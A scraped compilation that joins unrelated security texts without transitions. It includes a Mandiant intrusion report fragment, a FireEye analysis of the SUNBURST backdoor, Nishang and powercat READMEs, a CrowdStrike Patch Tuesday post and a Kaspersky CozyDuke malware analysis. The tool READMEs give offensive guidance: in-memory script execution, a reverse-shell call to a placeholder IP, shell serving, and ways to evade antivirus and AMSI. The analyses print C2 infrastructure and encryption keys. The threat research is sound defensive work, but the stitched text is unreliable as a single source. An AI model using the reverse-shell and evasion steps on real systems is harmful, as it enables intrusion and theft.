victimâs environment. Namely, Mandiant identified the threat actor disabling SysInternals Sysmon and Splunk Forwarders on victim machines that they accessed via Microsoft Remote Desktop in addition to clearing Windows Event Logs. Cobalt Strike BEACON: Backdoor written in C/C++ that is part of the Cobalt Strike framework. Supported backdoor commands include shell command execution, file transfer, file execution, and file management. BEACON can also capture keystrokes and screenshots as well as act as a proxy server. BEACON may also be tasked with harvesting system credentials, port scanning, and enumerating systems on a network. BEACON communicates with a command and control (C2) server via HTTP(S) or DNS. CEELOADER: Downloader written in C programing language. It supports shellcode payloads that are executed in memory. An obfuscation tool has been used to hide the code in CEELOADER in between large blocks of junk code with meaningless calls to the Windows API. The meaningful calls to the Windows API are hidden within obfuscated wrapper functions that decrypt the name of the API and dynamically resolve it before calling. CEELOADER communicates via HTTP and the C2 response is decrypted using AES-256 in CBC mode. Additionally, the HTTP request contains a statically defined id that may vary from sample to sample. CEELOADER does not contain a persistence mechanism. Mandiant assesses that some of this activity is UNC2652, a cluster of activity observed targeting diplomatic entities with phishing emails containing HTML attachments with malicious JavaScript, ultimately dropping a BEACON launcher.  Mandiant also assesses that some of this activity is UNC3004, a cluster of activity observed targeting both government and business entities through gaining access to Cloud Solution Providers/Managed Service Providers to gain access to downstream customers.  Microsoft has previously reported on both UNC2652 and UNC3004 activity and links it to UNC2452, the group behind the SolarWinds compromise, under the name âNobeliumâ. While it is plausible that they are the same group, currently, Mandiant does not have enough evidence to make this determination with high confidence. This intrusion activity reflects a well-resourced threat actor set operating with a high level of concern for operational security. The abuse of a third party, in this case a CSP, can facilitate access to a wide scope of potential victims through a single compromise. Though Mandiant cannot currently attribute this activity with higher confidence, the operational security associated with this intrusion and exploitation of a third party is consistent with the tactics employed by the actors behind the SolarWinds compromise and highlights the effectiveness of leveraging third parties and trusted vendor relationships to carry out nefarious operations.Â   Hundreds of consultants, analysts and reverse engineers have been working together to understand and track these security incidents over the past year. This larger group has built a baseline of knowledge that enables us to continue tracking this actor.

Learn morearrow_forward Start for Free   FireEye has discovered additional details about the SUNBURST backdoor since our initial publication on Dec. 13, 2020. Before diving into the technical depth of this malware, we recommend readers familiarize themselves with our blog post about the SolarWinds supply chain compromise,Â which revealed a global intrusion campaign by a sophisticated threat actor we are currently tracking as UNC2452. SUNBURST is a trojanized version of a digitally signed SolarWinds Orion plugin called SolarWinds.Orion.Core.BusinessLayer.dll. The plugin contains a backdoor that communicates via HTTP to third party servers. After an initial dormant period of up to two weeks, SUNBURST may retrieve and execute commands that instruct the backdoor to transfer files, execute files, profile the system, reboot the system, and disable system services. The malware's network traffic attempts to blend in with legitimate SolarWinds activity by imitating the Orion Improvement Program (OIP) protocol and persistent state data is stored within legitimate plugin configuration files. The backdoor uses multiple obfuscated blocklists to identify processes, services, and drivers associated with forensic and anti-virus tools. In this post, the following topics are covered in greater detail: Before reaching out to its C2 server, SUNBURST performs numerous checks to ensure no analysis tools are present. It checks process names, file write timestamps, and Active Directory (AD) domains before proceeding. We believe that these checks helped SUNBURST evade detection by anti-virus software and forensic investigators for seven months after its introduction to the SolarWinds Orion supply chain. First, the backdoor verifies that the lowercase name of the current process is solarwinds.businesslayerhost. UNC2452 avoided including this string directly in the source code by computing a hash of the string and comparing the result to the 64-bit number 17291806236368054941. The hash value is calculated as a standard FNV-1A 64-bit hash with an additional XOR by the 64-bit number 6605813339339102567. The additional XOR operation forces malware analysts to develop custom tools to brute force the hash preimage. Next, the backdoor only executes if the filesystem last write time of the .NET assembly SolarWinds.Orion.Core.BusinessLayer.dll is at least 12 to 14 days prior to the current time. The exact threshold is selected randomly from this interval. In other words, SUNBURST lays low for almost two weeks before raising its head. If the timestamp check fails, the backdoor will execute again at a random later time when it is invoked by a legitimate recurring background task. Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to ensure only one instance of the backdoor is running. If the named pipe already exists, the malware exits. SUNBURST stores its configuration in the legitimate SolarWinds.Orion.Core.BusinessLayer.dll.config file. It repurposes two existing settings in the appSettings section:Â  ReportWatcherRetry and ReportWatcherPostpone. During initialization, the backdoor determines if the ReportWatcherRetry setting is the value 3. This value indicates the malware has been deactivated and will no longer perform any network activity. As we describe later, UNC2452 can command the backdoor to disable itself. This feature may be utilized when the operator determines the victim is not of interest or that theyâve completed their mission. When investigating a system compromised by SUNBURST, review this setting to determine if the backdoor has been disabled. Note, the presence of this value does not offer proof the actor did not further compromise the environment before disabling SUNBURST. The backdoor also determines if the system is joined to an Active Directory (AD) domain and, if so, retrieves the domain name. Execution ceases if the system is not joined to an AD domain. SUNBURST checks the AD domain name against a blocklist and halts execution if it contains one of the following values: swdev.local emea.sales pci.local apac.lab swdev.dmz cork.lab saas.swi dmz.local lab.local dev.local lab.rio lab.brno lab.na test solarwinds Â  We suspect these hard-coded AD domains may be SolarWinds internal domains that UNC2452 wanted to avoid. Finally, SUNBURST verifies the system has internet connectivity by ensuring it can resolve the DNS name api.solarwinds.com. Otherwise, execution stops and retries at a random later time. SUNBURST's behavior is affected by the presence of malware analysis and security software. To disguise the strings used to detect these security tools, UNC2452 calculated and embedded a hash value for each string. While it is trivial for the backdoor to check for the existence of a hashed process name, it is computationally expensive to determine what string a hash value corresponds to (the âpreimageâ). However, thanks to some hard work by members of the information security community, the hashes have been successfully brute-forced. The list of hashes and their corresponding strings can be viewed at this FireEye GitHub page. SUNBURST uses the aforementioned FNV-1A plus XOR algorithm to compute the hash of each process name, service name, and driver filename on the system. If a blocklisted process or driver name is found, SUNBURST pauses and tries again later. The backdoor continues past this check only when there are no processes nor drivers from the blocklist present. If a blocklisted service is found, SUNBURST attempts to disable the blocklisted service by manipulating the service configuration in the Windows Registry. It sets the registry value HKLM\SYSTEM\CurrentControlSet\services\<service_name>\Start to the value 4, which corresponds to SERVICE_DISABLED. As a result, the blocklisted service is disabled on the next power cycle. This means the presence of a blocklisted service on a compromised host does not make a system immune to SUNBURST. After the registry modification is made, SUNBURST updates the ReportWatcherPostpone configuration value to reflect the service it disabled. Then, the backdoor pauses and retries the process and service blocklist checks at a later time. Subsequent service blocklist checks skip services already present in the ReportWatcherPostpone configuration key. SUNBURST will not treat the services it has disabled as members of the blocklist anymore. Therefore, during an incident response, forensic teams should consider recovering and decoding this configuration key to parse out which services SUNBURST attempted to disable. In this section we describe how SUNBURST uses an intermediary command and control (C2) coordinator to retrieve its final C2 server. The C2 coordinator instructs the backdoor to continue or halt beaconing. It also redirects SUNBURST to its final C2 server via DNS CNAME records. We believe this enables UNC2452 to compartmentalize their operations, limiting the network infrastructure shared among victims. The C2 coordinator is implemented as the authoritative DNS server for the avsvmcloud[.]com domain. To communicate with the C2 coordinator, SUNBURST uses a Domain Generation Algorithm (DGA) to construct subdomains of avsvmcloud[.]com and resolves the fully qualified domain names (FQDN) using the system DNS client. The backdoor interprets the DNS responses in an unusual way to receive orders from the C2 coordinator. The DGA generates subdomains with the following DNS suffixes to create the FQDN: A method named Update is responsible for initializing cryptographic helpers for the generation of these random-looking C2 subdomains. Subdomains are generated by concatenating an encoded user ID with an encoding of the system's domain name. The C2 coordinator can recover the victim domain name from the encoded data and likely uses this to route SUNBURST to its final C2 server. A user ID is generated based on three values: SUNBURST takes the MD5 hash of these combined values and encodes it using a custom XOR scheme. We believe this value is used by UNC2452 to track unique victims. SUNBURST uses four different forms of subdomains to signify the operating mode of the backdoor. Each form contains slightly different information. However, in two of the forms, investigators can recover the domain names of victim organizations. We recommend reviewing DNS logs to confirm the presence of a victimâs domain in SUNBURST C2 coordinator traffic. When SUNBURST is in its initial mode, it embeds the domain of the victim organization in its DGA-generated domain prefix. Once the malware transitions to an âactiveâ mode, the malware uses the other two forms of subdomains. These do not include the AD domain, but instead include encodings of either the list of running and stopped services or a timestamp. The open-source community has done a fantastic job reverse engineering many of the subdomain forms. While we are not aware of any public decoder scripts that reverse all four possible encodings, most decoders focus on recovering the most useful information: the user ID and domain name embedded in the subdomains. We recommend that incident responders for victim organizations with access to DNS logs use these tools to confirm their AD domains are not embedded within SUNBURST generated DNS subdomains. Note that this does not indicate follow-on activity. The following sources may be referenced for decoding such domains: SUNBURST uses a two-part C2 protocol that involves both DNS and HTTP. In âpassiveâ mode, the backdoor communicates with its C2 coordinator via DNS and receives high-level updates to its state. For example, the C2 coordinator may tell the backdoor to go to sleep or spring into action. When the backdoor is in âactiveâ mode, it communicates via HTTP to its final C2 server and receives detailed commands such as âspawn a processâ or âtransfer a fileâ. When communicating with the C2 coordinator, the backdoor continuously generates domains via its DGA. The backdoor delays execution for random intervals between generating domains. In some cases, this delay is up to 9 hours. If the C2 coordinator responds with a DNS A record, SUNBURST checks the resolved address against a hard-coded list of IP address blocks. If the address falls within a block, the backdoor transitions into an associated mode. The backdoor starts in the âpassiveâ mode where it does nothing but check blocklists, sleep, and beacon via DNS until a transition is seen. Other modes are âactiveâ, in which the malware communicates via HTTP, and âdisabledâ, in which the malware is permanently disabled. These modes and transitions are defined in the Modes of Operation section. The C2 coordinator may also respond with a DNS CNAME response. In this case, the malware uses the pointed-to domain from the CNAME response for HTTPS C2 communications. SUNBURST starts a thread to handle command execution and further C2 HTTP(S) callouts. As an investigator, if you see CNAME resolutions for subdomains of avsvmcloud[.]com, itâs possible that UNC2452 initiated follow-on C2 within the environment. Note, the malware must receive a DNS A record response pointing to one of the following subnets immediately prior to receiving a DNS CNAME response. Otherwise, the CNAME resolution will be ignored and treated as an error. In addition, for these subnets, the least-significant bytes from the A record IP address are parsed to obtain configuration data such as the proxy method to use, the URI scheme to use, and a delay value used in the HTTP thread. 18.130.0.0/16 99.79.0.0/16 184.72.0.0/15 Subsequent DNS A record responses in the following subnet ranges cause the DGA beaconing to continue. 8.18.144.0/23 18.130.0.0/16 71.152.53.0/24 99.79.0.0/16 87.238.80.0/21 199.201.117.0/24 184.72.0.0/15 Â  Otherwise, subsequent DNS A record responses in the following subnet ranges cause SUNBURST to terminate and update the configuration key ReportWatcherRetry to a value that prevents further execution. This is the killswitch. 10.0.0.0/8 fc00:: - fe00:: 96.31.172.0/24 172.16.0.0/12 fec0:: - ffc0:: 131.228.12.0/22 192.168.0.0/16 ff00:: - ff00:: 144.86.226.0/24 224.0.0.0/3 20.140.0.0/15 Â  While in âactiveâ mode, the DGA subdomain encoding does not include victim machine domain name information. Instead, the DGA subdomains encode a timestamp or the list of stopped/running services. To transition back to âpassiveâ mode, the malware operator may set the DNS server to resolve A records within the following IP ranges: 41.84.159.0/24 74.114.24.0/21 154.118.140.0/24 217.163.7.0/24 If the malware is transitioned from the âactiveâ mode back to âpassiveâ, the C2 coordinator must repeat the activation process if the operator wants to re-activate the sample. After receiving a CNAME DNS response with a new host to communicate with, SUNBURST starts a new thread to execute the method HttpHelper.Initialize. This method is responsible for the C2 communications and dispatching. The HTTP thread begins by delaying for a configurable amount of time that is controlled by the SetTime command. The HTTP thread delays for a minimum of one minute between callouts. The malware uses HTTP GET or POST requests. The sample disables certificate verification so it is possible to decrypt HTTPS traffic if SSL man-in-the-middle is performed. The malware constructs HTTP GET or POST request URIs from random selections of substrings. The scheme used depends on the A record received just prior to the CNAME DNS response. When sending a GET request, the malware adds an ""If-None-Match"" HTTP header that includes the encoded user ID. This likely allows the C2 server to determine which SUNBURST installation generated the request, further enabling multiplexing of C2 streams on a single server. In observed traffic, the C2 server employs steganography to hide data within HTTP response bodies and attempts to appear as benign XML related to .NET assemblies. Command data is spread across many GUID and hexadecimal strings. Commands are extracted from HTTP response bodies by searching for hexadecimal strings using the following regular expression: ""\{[0-9a-f-]{36}\}""|""[0-9a-f]{32}""|""[0-9a-f]{16}"". Matched substrings in the response are filtered for non-hex characters, joined together, and hex-decoded. Depending on the mode of operation, the malware may skip the steganography and send the encoded response in an HTTP response body. In the received C2 response, the first DWORD value indicates the actual size of the message. This value is followed immediately by the message with optional junk bytes added. The extracted message is single-byte XOR decoded using the first byte of the message. The result is then DEFLATE decompressed. The first character of the decompressed data is an ASCII integer that maps to a command ID, with optional additional command arguments delimited by space characters. The supported commands are shown in the following table. Command ID Operation Idle 0Â  No operationÂ  Exit 1Â  Terminate the current thread.Â  SetTime 2Â  Sets the delay time between main event loop executions Delay is in seconds, and varies random between [.9 * <delay>, 1.1 * <delay>]Â  If the delay is < 300 it is doubled on the next execution through the loop, this means it should settle onto an interval of around [5, 10] minutesÂ  o There is a second, unrelated delay routine that delays for a random interval between [16hrs, 83hrs]Â  Â  CollectSystemDescription 3Â  Profile the local system including hostname, username, OS version, MAC addresses, IP address, DHCP configuration, and domain information.Â  UploadSystemDescription 4Â  Perform anÂ HTTP request to the specified URL, parse the results and send the response to the C2 server.Â  RunTask 5Â  Starts a new process with the given file path and argumentsÂ  GetProcessByDescription 6Â  Returns a process listing.Â If noÂ argumentsÂ are provided, returnsÂ just theÂ PIDÂ and processÂ name.Â  IfÂ anÂ argument is provided, it also returns the parent PID and usernameÂ and domain for the processÂ owner.Â  KillTask 7Â  Terminate the given process, by PID.Â  GetFileSystemEntries 8Â  Given a path, and a match pattern recursively list files and directories.

GetRegistrySubKeyAndValueNames 16Â  Returns listing of subkeys and value names beneath the given registry path. Reboot 17Â  Attempts to immediately trigger a system reboot.Â  SUNBURST sends messages back to the C2 server using a protocol that consists of UTF-8 strings and an appended 4-byte error DWORD and 8-byte userID. These are bare DEFLATE compressed and single-byte XOR encoded with the XOR key prepended to the message. Message payloads of length 10,000 or less are turned into JSON documents that resemble the Orion Improvement Program (OIP) messages used legitimately by SolarWinds. Messages larger than 10,000 bytes are sent as-is in the HTTP request body. The fake OIP document contains the following fields: The JSON key EventType is hard-coded to the value Orion and the EventName is hard-coded to EventManager. The encoded message to send to the C2 server is split up into random ranges, Base64-encoded, and stored in the Message field of the objects in the steps array. Not all objects in the steps array contribute to the malware response. The integer in the Timestamp field must have the 0x2 bit set to indicate the contents of the Message field are used in the malware response. steps objects whose 0x2 bit is clear in the Timestamp field contain random data and are discarded when assembling the malware response. This may be an attempt to hinder analysis in the absence of the malware sample. As detailed in the DGA section, the malware has multiple modes of operation configured by the IP block that A records resolve to as well as depending on if CNAME records exist. These modes of operation are stored in internal enumerations. These mappings and values are described next. The following modes govern internal operations of the malware: Mode Name Value Description Truncate 3 Disabled; the malware killswitch has been activated and the sample may never run again without external modification to the XML configuration on-disk. New 4 Passive mode; DGA subdomains encode the systemâs domain name Append 5 Active mode; C2 beaconing will occur on next CNAME resolve or is already actively occurring. DGA domains encode either the userID or the list of services The mode values are written into the backdoor configuration key ReportWatcherRetry. Investigators may consider recovering the malware configuration and inspecting this configuration value to determine the last running mode of the malware. The following transitions govern how IP block ranges are translated into running modes: Transition Name Description Atm Transition to Truncate Ipx Transition from Append to New ImpLink Transition to Truncate NetBios Transition to Append, either start or continue C2 beaconing Unknown Not an IPv4 or IPv6 address, exit and retry DGA later The following diagram describes how the SUNBURSTâs DGA DNS responses act as mode transitions to control the malware before HTTP-based C2 beaconing has even begun:  Additionally, here is an annotated network log showing how a sequence of DNS resolutions can transition the malware mode:  To end this discussion of modes and transitions, a small note about the choices of these IP blocks. In cases such as the ImpLink IP blocks that activate the killswitch, itâs likely that the ranges were specifically chosen by the attacker to avoid being discovered by security researchers. In other cases, such as the NetBios and ""special"" NetBios IP blocks, the companies these blocks resolve to is likely irrelevant or at least beyond what can be definitively said without speculation. The following diagram provides a full picture of the malware's execution. Internally, SUNBURST uses a set of modes and transitions as described earlier. The names of these modes and transitions have no meaning. The malware authors purposely chose them as a form of obfuscation. When diagraming the malware's execution, these names were reused for clarity. Is a system running blocklisted processes, services, or drivers safe from compromise? Sometimes, but not always. SUNBURST unconditionally exits if blocklisted processes or drivers are found and will not run until they are no longer detected. On the other hand, services are disabled by setting a registry value that controls startup initialization and are not explicitly stopped. As a result, a blocklisted service may still be running when the malware performs its service checks later. For this reason, it is possible for a victim system to be infected while a blocklisted service is running. Additionally, SUNBURST only attempts to disable a service once and updates its configuration to mark the service as disabled. Once the configuration is updated, the service is not treated as a blocklisted entry during subsequent execution.Â  Does observing one DGA encoding over another provide any information during incident response? Short answer: it provides a hint for where to look but isnât a be-all tell-all alone. Noticing the DGA encoding change in network logs is a hint that the malware may have moved from New to Append or Append to New. This puts the malware in a mode where if a CNAME record is seen soon after, then HTTP C2 can begin. Incident response should focus on trying to identify CNAME records being successfully resolved instead of focusing on DGA encodings entirely. Identifying CNAME records is easier than tracking the malware mode through logs and a stronger signal. What is the ""killswitch""? FireEye discovered that certain DNS responses cause the malware to disable itself and stop further network activity. With the support and help of GoDaddyâs Abuse Team and the Microsoft Threat Intelligence Center, the domain used for resolving DGA domains was reconfigured to point to a sinkhole server under Microsoftâs control. The IP of this sinkhole server was specially chosen to fall into the range used by the malware to transition from its current mode (New or Append) into Truncate mode where it will be permanently inactive. In other words, SUNBURST infections should now be inoculated due to the killswitch. When C2 communication occurs, is a CNAME record required? CNAME records are required for HTTP C2 beaconing to occur and are provided by the C2 coordinator to specify the final C2 server. C2 activity must occur over a domain name provided via a CNAME record. It cannot occur directly via a raw IP. To initialize C2 beaconing, the backdoor first looks for an A record response from one of its special NetBios subnets and subsequently expects to receive a CNAME record. If a DGA domain is decoded to a company domain name, is that company compromised? When the backdoor is in âpassiveâ mode it uses the DGA encoding which embeds victim AD domain names. This means that any system where the backdoor is present may have started trying to contact DNS servers where an attacker could then activate the backdoor to begin active C2 communications. In most cases this did not occur and backdoors for non-targets were disabled by the operator. Therefore, it cannot be assumed that an organization experienced follow-on activity if their domain is decoded from any DNS logs. Specifically, itâs only an indicator that the backdoor code was present and capable of being activated. We have seen substantial community contributions to our public SUNBURST GitHub repository. We would like to publicly thank all contributors to this repository. Specifically, all FNV hashes embedded within SUNBURST have been brute-forced. This is a huge amount of compute power that members of the community provided free-of-charge to help others. We want to thank everyone who contributed hashes and specifically callout the Hashcat community, which organized to systematically break each hash. This was essential for breaking the final few hashes whose preimage were of considerable length. Matthew Williams, Michael Sikorski, Alex Berry and Robert Wallace.

Founder of Altered Security - Hands-on red team and enterprise security training! Import all the scripts in the current PowerShell session (PowerShell v3 onwards). Use the individual scripts with dot sourcing. To get help about any script or function, use: Note that the help is available for the function loaded after running the script and not the script itself since version 0.3.8. In all cases, the function name is same as the script name. For example, to see the help about Get-WLAN-Keys.ps1, use Nishang scripts are flagged by many Anti Viruses as malicious. The scrripts on a target are meant to be used in memory which is very easy to do with PowerShell. Two basic methods to execute PowerShell scripts in memory: Method 1. Use the in-memory dowload and execute:
Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session. Method 2. Use the -encodedcommand (or -e) parameter of PowerShell
All the scripts in Nishang export a function with same name in the current PowerShell session. Therefore, make sure the function call is made in the script itself while using encodedcommand parameter from a non-PowerShell shell. For above example, add a function call (without quotes) ""Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]"". Encode the scrript using Invoke-Encode from Nishang: Encoded data written to .\encoded.txt Encoded command written to .\encodedcommand.txt From above, use the encoded script from encodedcommand.txt and run it on a target where commands could be executed (a remote shell, meterpreter native shell, a web shell etc.). Use it like below: If the scripts still get detected changing the function and parameter names and removing the help content will help. In case Windows 10's AMSI is still blocking script execution, see this blog: http://www.labofapenetrationtester.com/2016/09/amsi.html Nishang currently contains the following scripts and payloads.

(Powershell Version 2 and Later Supported) powercat is a powershell function.  First you need to load the function before you can execute it.  You can put one of the below commands into your powershell profile so powercat is automatically loaded when powershell starts. By default, powercat reads input from the console and writes input to the console using write-host. You can change the output type to 'Bytes', or 'String' with -o. powercat can be used to transfer files back and forth using -i (Input) and -of (Output File). powercat can be used to send and serve shells. Specify an executable to -e, or use -ep to execute powershell. powercat supports more than sending data over TCP. Specify -u to enable UDP Mode. Data can also be sent to a dnscat2 server with -dns. Make sure to add ""-e open --no-cache"" when running the dnscat2 server. Relays in powercat work just like traditional netcat relays, but you don't have to create a file or start a second process. You can also relay data between connections of different protocols. Payloads which do a specific action can be generated using -g (Generate Payload) and -ge (Generate Encoded Payload). Encoded payloads can be executed with powershell -E. You can use these if you don't want to use all of powercat. powercat can also be used to perform portscans, and start persistent servers.

CrowdStrike Blog,https://www.crowdstrike.com/blog/patch-tuesday-analysis-november-2022/,"November 10, 2022 Microsoft has released 66 security patches for its November 2022 Patch Tuesday rollout. Of these, 10 vulnerabilities are rated Critical and the remaining 56 are rated Important. It should be noted that this monthâs patching update does include the highly anticipated patches for ProxyNotShell, which we suggest you promptly apply; if your team decides to wait, we have listed our mitigation recommendations in our October 2022 Patch Tuesday blog.Â  Another zero-day vulnerability that is worth special attention and prompt patching is CVE-2022-41128, an actively exploited Critical bug in Windows Scripting Language with a CVSS of 8.8, which impacts the JScript9 scripting language. This bug could be exploited by convincing the end user to visit either a specially crafted website or server share. In doing so, they would get their code to execute on an affected system at the level of the logged-on user. Microsoft has not yet provided the details, but we can expect this will be a popular bug to include in exploit kits. This monthâs leading risk type is elevation of privilege (40%), followed by remote code execution (24%) and information disclosure (15%). Figure 1. Breakdown of November 2022 Patch Tuesday attack types The Microsoft Windows product family received the most patches this month with 40, followed by Extended Support Updates (24) and Microsoft Office products (11). Also covered in the update is CVE-2022-41073, an actively exploited Windows Print Spooler Elevation of Privilege Vulnerability with a CVSS of 7.8. Figure 2. Breakdown of product families affected by November 2022 Patch Tuesday Threat actors continue to exploit the vast attack surface that is the Windows Print Spooler. While weâve seen plenty of new patches since PrintNightmare, CVE-2022-41073 is listed as being actively exploited. As you may be familiar, disabling the print spooler should be an effective workaround â this, of course, breaks printing, but if youâre in a situation where patching isnât feasible, it is an option. As shown in Figure 3, this CVE is ranked as Important, along with CVE-2022-41091, a Windows Mark of the Web Security Feature Bypass Vulnerability. This vulnerability is also listed as being under active attack, but again, Microsoft provides no information on how widespread these attacks may be. Figure 3. Zero-day vulnerability and print spooler vulnerability patched in November 2022 Official patches for ProxyNotShell, two vulnerabilities discovered in and exploited since September, are being released this month. Yes, they were expected last month, but they are finally here. At the time of discovery, researchers reported that these elevation of privilege and remote code execution vulnerabilities â CVE-2022-41082 and CVE-2022-41040 â had been used to infect on-premises Exchange servers with web shells, the text-based interfaces that allow people to remotely execute commands. Better known as ProxyNotShell, these vulnerabilities affect on-premises Exchange servers. Microsoft said in early October it was aware of only a single threat actor exploiting the vulnerabilities and the actor had targeted fewer than 10 organizations. CrowdStrike recommends applying patches as soon as possible if you have vulnerable on-premises or hybrid exchange servers where temporary mitigation has not been applied. CVE-2022-41080, a Microsoft Exchange Server elevation of privilege vulnerability, was disclosed by Microsoft and is labeled as âexploitation more likely,â but there are no records of active exploitation in the wild. This new vulnerability scores a CVSS 8.8, making it a critical vulnerability to address. Figure 4. Critical vulnerabilities in MS Exchange For this month’s release, the two privilege escalation vulnerabilities in Kerberos stand out, especially because Microsoft notes this is a phased rollout of fixes. Apparently you will need to take additional steps beyond applying the patch; specifically, youâll need to review KB5020805 and KB5021131 to see the changes made and next steps. Also, there are three Critical patches for Point-to-Point Tunneling Protocol (PPTP). This seems to be a continuing trend of researchers looking for bugs in legacy protocols. As we said on previous occasions, if you rely on PPTP, you should really consider upgrading to something more modern. Figure 5. Critical vulnerabilities in Kerberos and PPTP There are two bugs in Windows Group Policy and successful exploitation of these vulnerabilities require the attacker to have privileges to create Group Policy Templates. As is best practice, regular validation and audits of administrative groups should be conducted. Regarding the SharePoint vulnerabilities, we know for CVE-2022-41122, the attacker must be authenticated and possess the permissions for page creation in order to exploit it.Â  As seen in figure 6, there are three Important bugs in Microsoft Word, with CVSS of 7.8 and 5.5. We can confirm the Preview Pane is not an attack vector for these bugs; however, we wanted to emphasize the importance of patching Microsoft Office-related vulnerabilities (in this case Word) as these are heavily used products. In an email attack scenario, for example, an attacker could exploit these vulnerabilities by sending a specially crafted file to the user and convincing them to open the file. Figure 6. Important Vulnerabilities in Group Policy, SharePoint and Microsoft Word What gets patched and what is moved to the back burner should be taken into consideration in conjunction with other areas of a defensive security posture, including security hygiene and XDR. Your organizationâs security strategy, and what is involved in your patching program, could have a direct impact on the strength of your organizationâs security. Itâs important to develop a strategy that works together with the broader organizationâs security goals, not just within security operations.Â  The CrowdStrike Falcon platform collects and analyzes trillions of endpoint events every day from millions of sensors deployed across 176 countries.

APT reports
 21 Apr 2015 
  minute read								 Authors CozyDuke (aka CozyBear, CozyCar or “Office Monkeys”) is a preciseÂ attacker. Kaspersky Lab has observed signs of attacks against government organizations and commercial entities in the US, Germany, South Korea and Uzbekistan. In 2014, targets included the White House and the US Department of State, as believed. The operation presents several interesting aspects The actor often spearphishes targets with e-mails containing a link to a hacked website. Sometimes it is a high profile, legitimate site such as “diplomacy.pl”, hosting a ZIP archive. The ZIP archive contains a RAR SFX which installs the malware and shows an empty PDF decoy.  In other highly successful runs, this actor sends out phony flash videos directly as email attachments. A clever example is “Office Monkeys LOL Video.zip”. The executable within not only plays a flash video, but drops and runs another CozyDuke executable. These videos are quickly passed around offices with delight while systems are infected in the background silently. Many of this APT’s components are signed with phony Intel and AMD digital certificates. Recent CozyDuke APT activity attracted significant attention in the news: Sources: State Dept. hack the ‘worst ever’, CNN News, March 2015
White House computer network ‘hacked’, BBC News, October 2014
Three Months Later, State Department Hasn’t Rooted Out Hackers, Wall Street Journal, February 2015
State Department shuts down its e-mail system amid concerns about hacking, Washington Post, November 2014  Let’s examine a smattering of representative CozyDuke files and data. There is much to their toolset. CozyDukeÂ droppers and spyware components often maintain fairlyÂ common characteristics, but these files’ functionality are modified in slight ways depending on the team’s needs. This rapid development and deployment is interesting. 68271df868f462c06e24a896a9494225,Office Monkeys LOL Video.zip Believe it or not, recipients in bulk run the file within: 95b3ec0a4e539efaa1faa3d4e25d51de,Office Monkeys (Short Flash Movie).exe This file in turn drops two executables to %temp%: It first launches Monkeys.exe, playing a self-contained, very funny video of white-collar tie wearing chimpanzees working in a high rise office with a human colleague. It then launches player.exe, a CozyDuke dropper maintaining anti-detection techniques: 3d3363598f87c78826c859077606e514,player.exe,338kb,Trojan.Win32.CozyBear.v,CompiledOn:2014.07.02 21:13:33 The file collects system information, and then invokes a WMI instance in the rootsecuritycenter namespace to identify security products installed on the system, meaning that this code was built for x86 systems, wql here: SELECT * FROM AntiVirusProduct
SELECT * FROM FireWallProduct The code hunts for several security products to evade: In addition to the WMI/wql use, it also hunts through the “SOFTWAREMicrosoftWindowsCurrentVersionUninstall” registry key looking for security products to avoid. Following these checks, it drops several more malware files signed with the pasted AMD digital signature to a directory it creates. These files are stored within an 217kb encrypted cab file in the dropper’s resources under the name “A”. The cab file was encrypted and decrypted using a simple xor cipher with a rotating 16 byte key: x36x11xddx08xacx4bx72xf8x51x04x68x2ex3ex38x64x32. The cab file is decompressed and its contents are created on disk. These dropped files bundle functionality for both 64bit and 32bit Windows systems and are all located within one directory:

4152e79e3dbde55dcf3fc2014700a022,6kb,racss.dat The code copies rundll32.exe from windowssystem32 to its newly created %appdata%ATI_Subsystem subdirectory as “amdocl_as32.exe” alongside the three dll’s listed above. It runs atiumdag.dll with two parameter values, it’s only export and an arbitrary pid, Â i.e.:
“C:Documents and SettingsuserApplication DataATI_Subsystemamdocl_as32.exe” “C:Documents and SettingsuserApplication DataATI_Subsystematiumdag.dll””, ADL2_ApplicationProfiles_System_Reload 1684″ This dll is built with anti-AV protections as well. However, it looks for a different but overlapping set, and the random duplication suggests that this component was cobbled together with its dropper, partly regionally based on target selection. The code collects information about the system and xml formats this data prior to encryption for proper parsing:  Finally, this process beacons to www.sanjosemaristas.com, which appears to be a site that has been compromised and misused multiple times in the past couple of years.
hxxp://www.sanjosemaristas[.]com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}, providing the current network adapter’s service name GUID. It uses standard Win32 base cryptography functions to generate a CALG_RC4 session key to encrypt the collected data communications and POSTs it to the server. Samples are usually signed with a fake certificate – we’ve seen two instances, one AMD and one Intel:  Some of the malware uses an encrypted configuration file which is stored on disk as “racss.dat”. This is encrypted by RC4, using the key {0xb5, 0x78, 0x62, 0x52, 0x98, 0x3e, 0x24, 0xd7, 0x3b, 0xc6, 0xee, 0x7c, 0xb9, 0xed, 0x91, 0x62}. Here’s how it looks decrypted:  The attackers send commands and new modules to be executed to the victims through the C&Cs. The C&C scripts store these temporarily until the victim next connects to retrieveÂ local files. We’ve identified two such files: Here’s how such a database file appears:  These are BASE64 encoded and use the same RC4 encryption key as the malware configuration. Decoding them resulted in the following payloads: 59704bc8bedef32709ab1128734aa846, ChromeUpdate.ex_

e0b6f0d368c81a0fb197774d0072f759, screenshot_task.dll Decoding them also resulted in a set of tasking files maintaining agent commands and parameter values: conf.xml And a set of “reporting” files, maintaining stolen system “info”, error output, and “AgentInfo” output, from victim systems: DCOM_amdocl_ld_API_.raw

7.txt screenshot_task.dll is a 32-bit dll used to take a screenshot of the full desktop window and save it as a bitmap in %temp%. The number of times the screenshot is repeated is configurable within the xml task file. cmd_task.dll is a 32-bit dll that maintains several primitives. It is used to create new processes, perform as a command line shell, and several other tasks. Each of these payloads is delivered together with a configuration file that explains how to run it, for instance: 
